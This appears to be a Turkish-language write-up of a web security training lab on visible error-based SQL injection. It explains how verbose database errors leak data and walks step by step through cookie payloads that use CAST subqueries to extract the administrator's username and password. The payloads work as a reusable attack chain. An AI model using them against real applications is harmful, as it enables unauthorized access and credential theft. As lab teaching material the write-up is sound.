# Visible error-based SQL injection

## Konu Açıklaması (Extracting Sensitive Data via Verbose SQL Error Messages)
Veritabanının yanlış yapılandırılması bazen çok detaylı hata mesajlarının ekrana yansımasına sebebiyet verebilir. Bu detaylı hata mesajları (verbose errors), arkada çalışan SQL sorgusunun yapısını, tablo ve sütun isimlerini veya veri tipini ele vererek saldırganın veritabanından hassas bilgi sızdırmasına olanak tanır.

### Hata Tetikleme ve İnceleme
Örneğin `TrackingId` gibi bir parametrenin sonuna tek tırnak (`'`) eklendiğinde dönen hata mesajı incelenir:

```
Unterminated string literal started at position 52 in 
SQL SELECT * FROM tracking_id = ''... Expected char
```

* **Yorum:** Bu hata mesajı, kullanıcı girdisinin tırnak işaretleri arasına doğrudan yerleştirildiğini ve kapatılmamış bir dize (unclosed string literal) yüzünden sorgunun kırıldığını kanıtlar.

### `CAST()` Fonksiyonu ile Veri Sızdırma
`CAST()` fonksiyonu bir veri tipini başka bir veri tipine dönüştürmek için kullanılır. Hata tabanlı sızdırmada (error-based data extraction), metin türündeki hassas veriyi zorla tamsayıya (`integer`) dönüştürmeye çalışarak veritabanının hata fırlatmasını sağlarız. Veritabanı dönüştüremediği değeri hata mesajı içerisinde ekrana basar.

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

**Dönen Örnek Hata:**
```
ERROR: invalid input syntax for type integer: "Example data"
```
Bu sayede `"Example data"` verisi doğrudan hata çıktısından okunmuş olur.

---

## Lab Çözümü

### Lab Bilgileri
- **Lab Adı:** Visible error-based SQL injection
- **Zafiyet Türü:** Error-Based SQL Injection (Verbose Errors)
- **Amaç:** Detaylı SQL hata mesajlarını kullanarak `users` tablosundaki `administrator` kullanıcısının parolasını sızdırmak ve sisteme giriş yapmak.

### Çözüm Adımları
1. **İsteği Yakalama ve İnceleme:**
   - Burp Suite'in dahili tarayıcısı (built-in browser) ile laboratuvar uygulaması gezilir.
   - **Proxy > HTTP history** sekmesine gidilerek `TrackingId` çerezi (cookie) içeren bir `GET /` isteği bulunur ve incelenmek üzere **Repeater** sekmesine gönderilir (`Ctrl + R` / `Cmd + R`).

2. **Güvenlik Açığını Doğrulama (Syntax Error Tetikleme):**
   - Repeater'da `TrackingId` değerinin sonuna tek tırnak (`'`) eklenip istek gönderilir:
     ```http
     Cookie: TrackingId=ogAZZfxtOKUELbuJ'
     ```
   - **Gözlem:** Yanıtta ayrıntılı bir SQL hata mesajı (verbose error) döner. Bu hata, tüm SQL sorgusunu ve çerez değerinin tek tırnaklı bir dize (`single-quoted string`) içerisine gömüldüğünü açığa çıkarır.

3. **Sorguyu Onarma (Comment-Out):**
   - Hataya yol açan tek tırnak kapatıldıktan sonra sorgunun geri kalanını devre dışı bırakmak için SQL yorum satırı karakterleri (`--`) eklenir:
     ```http
     Cookie: TrackingId=ogAZZfxtOKUELbuJ'--
     ```
   - **Gözlem:** İstek gönderildiğinde artık hata alınmaz. Bu durum sorgunun sözdizimsel olarak (`syntax`) başarıyla tamamlandığını gösterir.

4. **Alt Sorgu (Subquery) ve Tip Dönüşümü Ekleme:**
   - Yorum karakterlerinden önce genel bir `SELECT` alt sorgusu eklenir ve değer `int` tipine dönüştürülmeye çalışılır:
     ```http
     Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
     ```
   - **Gözlem:** `AND condition must be a boolean expression` şeklinde yeni bir hata döner. Çünkü `AND` ifadesi mantıksal (boolean) bir karşılaştırma bekler.

5. **Mantıksal Koşul Oluşturma:**
   - `AND` şartını sağlamak için dönüştürülen değer basit bir karşılaştırma operatörü (`=`) ile kontrol edilir:
     ```http
     Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
     ```
   - **Gözlem:** Hata ortadan kalkar. Sorgu yeniden geçerli hale gelmiştir.

6. **Kullanıcı Adlarını Çekme ve Karakter Limiti Sorunu:**
   - Test sorgusu, `users` tablosundan kullanıcı adını çekecek şekilde güncellenir:
     ```http
     Cookie: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
     ```
   - **Gözlem:** Tekrar ilk baştaki sözdizimi hatası alınır. Sorgunun karakter sınırı (character limit) nedeniyle kesildiği (`truncated`) ve eklenen `--` yorum karakterlerinin yok sayıldığı görülür.

7. **Karakter Tasarrufu Yapma:**
   - Karakter sınırını aşmamak için orijinal `TrackingId` değeri silinir ve sorgu doğrudan tırnakla başlatılır:
     ```http
     Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
     ```
   - **Gözlem:** Kesilme hatası aşılır; ancak bu kez sorgunun birden fazla satır (`more than one row`) döndürmesinden kaynaklı bir veritabanı hatası alınır.

8. **Tek Satıra İndirgeme ve Kullanıcı Adını Sızdırma:**
   - Alt sorgunun yalnızca tek bir satır döndürmesi için `LIMIT 1` eklenir:
     ```http
     Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
     ```
   - **Gözlem:** Veritabanı metin tipindeki kullanıcı adını tam sayıya (`integer`) çeviremediği için hata mesajında sızdırır:
     ```
     ERROR: invalid input syntax for type integer: "administrator"
     ```
     Böylece ilk kullanıcının `administrator` olduğu doğrulanır.

9. **Parolayı Sızdırma ve Giriş Yapma:**
   - `administrator` kullanıcısının parolasını sızdırmak için sorgudaki `username` sütunu `password` olarak değiştirilir:
     ```http
     Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
     ```
   - **Gözlem:** Hata mesajında `administrator` hesabına ait parola doğrudan yer alır:
     ```
     ERROR: invalid input syntax for type integer: "<sızdırılan_parola>"
     ```
   - Elde edilen bu parola ile `administrator` hesabına giriş yapılarak laboratuvar tamamlanır.
